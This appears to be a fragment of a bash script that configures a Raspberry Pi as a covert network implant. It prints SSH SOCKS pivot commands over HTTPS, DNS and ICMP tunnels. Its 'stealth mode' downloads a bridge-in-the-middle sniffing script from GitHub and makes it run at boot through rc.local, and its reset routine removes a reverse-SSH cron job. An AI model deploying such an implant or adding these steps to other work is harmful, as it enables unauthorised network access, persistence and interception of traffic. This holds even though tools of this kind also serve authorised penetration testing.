echo -e "\n ${GREEN}[+] From The Main Server:${RESET}   ssh -D 1080 -p $HTTPSSSHPivotPort pi@localhost"
echo -e "\n ${GREEN}[+] From The Main Server:${RESET}   ssh -D 1080 -p $DNSSSHPivotPort pi@localhost"
echo -e "\n ${GREEN}[+] From The Main Server:${RESET}   ssh -D 1080 -p $ICMPSSHPivotPort pi@localhost"

fi


##### Stealth Raspberry Pi
if [ "${Stealth}" != "false" ]; then
   echo -e "\n ${GREEN}[+]${RESET} Creating stealth mode"
# sudo iptables -F
# sudo iptables -A INPUT -p icmp --icmp-type echo-request -j DROP
# sudo iptables -A INPUT -d 10.0.0.0/8 -j ACCEPT
# sudo iptables -A INPUT -d 172.16.0.0/12 -j ACCEPT
# sudo iptables -A INPUT -d 192.168.0.0/16 -j ACCEPT
# sudo iptables -A OUTPUT -d 10.0.0.0/8 -j ACCEPT
# sudo iptables -A OUTPUT -d 172.16.0.0/12 -j ACCEPT
# sudo iptables -A OUTPUT -d 192.168.0.0/16 -j ACCEPT
# sudo iptables -P INPUT ACCEPT
# sudo ip6tables -P INPUT ACCEPT
# sudo iptables -P OUTPUT DROP
# sudo ip6tables -P OUTPUT DROP


wget https://raw.githubusercontent.com/jkadijk/BitM/master/autosniff.py -O /root/autosniff.py

sed -i 's/for i in `seq 0 2`; do ifconfig eth$i up && dhclient eth$i; done//g' /etc/rc.local
sed -i 's/exit 0//g' /etc/rc.local

cat <<EOF >> "/etc/rc.local"
for i in \`seq 1 2\`; do ifconfig eth\$i down; done
ifconfig eth0 up && dhclient eth0
cd /root/ && python /root/autosniff.py &
/etc/init.d/ssh start &

exit 0
EOF

fi



##### Configuring 3G/4G Modem
#if [ "${ResetDevice}" != "false" ]; then
#   echo -e "\n ${GREEN}[+]${RESET} Configuring 3G/4G Modem"
#    echo -e "\n ${YELLOW}[i]${RESET} Enter Phone Number to Connect to:"
#    read phonenum
#    echo -e "\n ${YELLOW}[i]${RESET} Enter the cellular username:"
#    read celluser
#    echo -e "\n ${YELLOW}[i]${RESET} Enter the cellular password:"
#    read cellpass
# minicom –s
# Choose: Serial Port Setup
#    Change: Serial Device (Ex. /dev/ttyUSB3)
# at+cfun=1
# at+cgdcont =1,"IP","Carrier_APN"
# at!scdftprof=1
# at!scprof=1," ",1,0,0,0
# OPTIONAL
# AT$QCPDPP=1,1,"password","username"
# at!gstatus?

##### OPTION 2 wvdial
#    /etc/wvdial.conf


# /etc/network/interfaces
# auto wwan0
# iface wwan0 inet dhcp  


#fi



##### Reset Raspberry Pi
if [ "${ResetDevice}" != "false" ]; then
   echo -e "\n ${GREEN}[+]${RESET} Resetting Raspberry Pi Configs"
   echo -e "\n ${YELLOW}[i]${RESET} Resetting Managed Interfaces"
cat <<EOF >> "/etc/NetworkManager/NetworkManager.conf"
[main]
plugins=ifupdown,keyfile

[ifupdown]
managed=false
EOF
#   sed -i 's/managed=true/managed=false/g' /etc/NetworkManager/NetworkManager.conf
   echo -e "\n ${YELLOW}[i]${RESET} Flushing Firewall"
    iptables -F
    iptables -X
    iptables -t nat -F
    iptables -t nat -X
    iptables -t mangle -F
    iptables -t mangle -X
    iptables -P INPUT ACCEPT
    iptables -P FORWARD ACCEPT
    iptables -P OUTPUT ACCEPT
    ebtables -F
    ebtables -X

   echo -e "\n ${YELLOW}[i]${RESET} Removing CRON Jobs"
   rm -f /etc/cron.d/revssh

   echo -e "\n ${YELLOW}[i]${RESET} Resetting rc.local"
cat <<EOF > "/etc/rc.local"
#!/bin/sh -e
#
# rc.local
#
# This script is executed at the end of each multiuser runlevel.
# Make sure that the script will "exit 0" on success or any other
# value on error.
#
# In order to enable or disable this script just change the execution
# bits.
#
# By default this script does nothing.

for i in \`seq 0 2\`; do ifconfig eth\$i up && dhclient eth\$i; done
exit 0
EOF

   echo -e "\n ${YELLOW}[i]${RESET} Resetting Routing Tables"
cat <<EOF > "/etc/iproute2/rt_tables"
#
# reserved values
#
255     local
254     main
253     default
0       unspec
#
# local
#
#1      inr.ruhep
EOF

fi
